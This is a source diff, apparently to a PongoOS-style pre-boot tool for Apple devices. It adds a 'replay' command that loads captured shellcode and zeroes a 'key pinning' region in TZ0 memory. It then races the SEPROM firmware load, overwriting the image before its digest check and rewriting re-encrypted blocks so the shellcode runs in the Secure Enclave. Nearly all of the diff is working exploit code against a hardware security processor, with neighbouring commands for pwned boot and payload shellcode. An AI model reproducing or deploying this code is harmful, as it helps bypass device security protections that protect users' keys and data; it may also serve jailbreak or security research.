@@ -24,6 +24,7 @@
  * SOFTWARE.
  *
  */
+#include "stdio.h"
 #include <pongo.h>
 #include <img4/img4.h>
 #include <fuse/fuse.h>
@@ -1401,6 +1402,161 @@ void sep_shc(const char *cmd, char *args)
     {
         iprintf("0x%llx\n", *(volatile uint64_t *)(tz0_base + i * 8));
     }
+    free_contig(fake_img4, 0x200000);
+}
+
+// Observe how SEPROM performs SEPOS startup
+void sep_replay(const char *cmd, char *args)
+{
+    int first_race_tick = atoi(args);
+    if (first_race_tick <= 0)
+    {
+        first_race_tick = 900000;
+    }
+    // First we need to read captured shellcode
+    uint32_t shc_len = loader_xfer_recv_count;
+    uint32_t shc_block_count = (shc_len) / 64;
+    if(shc_len == 0)
+    {
+        iprintf("No shellcode received, aborting\n");
+        return;
+    }
+    const uint8_t *data = loader_xfer_recv_data;
+    iprintf("Received %u bytes, first byte: 0x%02x\n", shc_len,
+            (unsigned)data[0]);
+    uint8_t *replay_layout = malloc(shc_len);
+    // buffer after seprom changes encryption channel
+    uint8_t *second_replay_layout = malloc(shc_len);
+    if (!replay_layout || !second_replay_layout)
+    {
+        iprintf("Failed to allocate memory for replay layout, aborting\n");
+        return;
+    }
+    memcpy(replay_layout, data, shc_len);
+    iprintf("OK\n");
+    loader_xfer_recv_count = 0;
+    if (shc_len % 64 != 0)
+    {
+        iprintf("Shellcode length is not a multiple of 64, aborting\n");
+        return;
+    }
+
+    seprom_ping();
+    uint64_t tz0_base, tz0_size;
+    if (!tz_get(0, &tz0_base, &tz0_size))
+    {
+        panic("Failed to get TZ0 bounds");
+    }
+    map_range(0xc00000000, tz0_base, tz0_size, 3, 2, true);
+    tz0_base = 0xc00000000;
+    cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
+    memset((void *)tz0_base, 0, 0x4000);
+    cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
+    if (socnum >= 0x8000)
+    {
+        iprintf("performing tz blackbird and tz lockdown\n");
+        tz_blackbird();
+        tz_lockdown();
+    }
+    iprintf("start to boot tz0\n");
+    seprom_boot_tz0_async();
+
+    // key pinning hax
+    for (int x = 0; x < 10000; x++)
+    {
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x18) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x20) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x28) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x48) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x50) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x58) = 0;
+    }
+    iprintf("finished writing key pinning area\n");
+    // event_wait_asserted(&sep_done_tz0_event);
+    iprintf("seprom booted tz0: %d\n", sep_has_done_tz0);
+    seprom_ping();
+    if (socnum < 0x8000)
+    {
+        // On A8/A8X, we need to load art to sep
+        seprom_artload();
+        iprintf("seprom loaded art: %d\n", seprom_has_accepted_art);
+    }
+    volatile uint64_t *watchdog;
+    watchdog = (volatile uint64_t *)tz0_base + 4; // offset 0x20
+    uint64_t observed_value[10] = {};
+    int changed_tick[10] = {};
+    int number_of_change = 0;
+    observed_value[number_of_change] = *watchdog;
+    changed_tick[number_of_change] = 0;
+    // Kick off SEPOS loading
+    seprom_fwload_async(NULL);
+    // Overwrite the original img4 with the captured shellcode to replay it
+    // It must be performed before SEPROM calculates the digest of the img4p
+    for (int i = 0; i <= 0x400000 && number_of_change < 10; i++)
+    {
+        __asm__ volatile("dmb sy\n"
+                         "isb\n" ::
+                             : "memory");
+        if (*watchdog != observed_value[number_of_change])
+        {
+            number_of_change++;
+            observed_value[number_of_change] = *watchdog;
+            changed_tick[number_of_change] = i;
+        }
+        // here we perform the replay 
+        if (i == first_race_tick)
+        {
+            fast_copy((void *)tz0_base, (void *)replay_layout, shc_len);
+            break;
+        }
+    }
+    // Detect if the encryption channel has changed, and if so,
+    // capture the new encrypted data to second_replay_layout
+    bool encryption_channel_changed[2048] = {0};
+    int overwrite_count = 0;
+    for (int j = 0; j < 0x400000 && overwrite_count < shc_block_count; j++)
+    {
+        __asm__ volatile("dmb sy\n"
+                         "isb\n" ::
+                             : "memory");
+        for (int i = 0; i < shc_block_count; i++)
+        {
+            if (*(volatile uint64_t *)(tz0_base + i * 0x40) !=
+                    *(volatile uint64_t *)(replay_layout + i * 0x40) &&
+                encryption_channel_changed[i] == 0)
+            {
+                fast_copy((void *)(second_replay_layout + i * 0x40),
+                          (void *)(tz0_base + i * 0x40), 0x40);
+                encryption_channel_changed[i] = 1;
+                overwrite_count++;
+            }
+        }
+    }
+    enable_interrupts();
+    // Overwrite the decrypted data and relocated data with the captured data to replay the shellcode
+    for (int j = 0; j < 0x400000; j++)
+    {
+        __asm__ volatile("dmb sy\n"
+                         "isb\n" ::
+                             : "memory");
+        for (int i = 0; i < shc_block_count; i++)
+        {
+            if (*(volatile uint64_t *)(tz0_base + i * 0x40) !=
+                *(volatile uint64_t *)(second_replay_layout + i * 0x40))
+            {
+                fast_copy((void *)(tz0_base + i * 0x40),
+                          (void *)(second_replay_layout + i * 0x40), 0x40);
+            }
+        }
+    }
+
+    iprintf("sepos booted: %d\n", seprom_has_left_to_sepos);
+    iprintf("number_of_change = %i\n", number_of_change);
+    for (int i = 0; i <= number_of_change; i++)
+    {
+        iprintf("%dth observed_value=%llx, at tick=%d\n", i, observed_value[i],
+                changed_tick[i]);
+    }
 }
 
 static struct sep_command command_table[] = {
@@ -1422,6 +1578,7 @@ static struct sep_command command_table[] = {
     SEP_COMMAND("boot", "boot pwned tz0 image", sep_pwned_boot),
     SEP_COMMAND("observe", "observe how sep works", sep_observe),
     SEP_COMMAND("shc", "get sep payload shellcode", sep_shc),
+    SEP_COMMAND("replay", "replay a previous shellcode", sep_replay),
 #endif
     SEP_COMMAND("encrypt", "encrypt a kbag (requires pwned SEPROM)", sep_aes_encrypt),
     SEP_COMMAND("decrypt", "decrypt a kbag (requires pwned SEPROM)", sep_aes_decrypt),
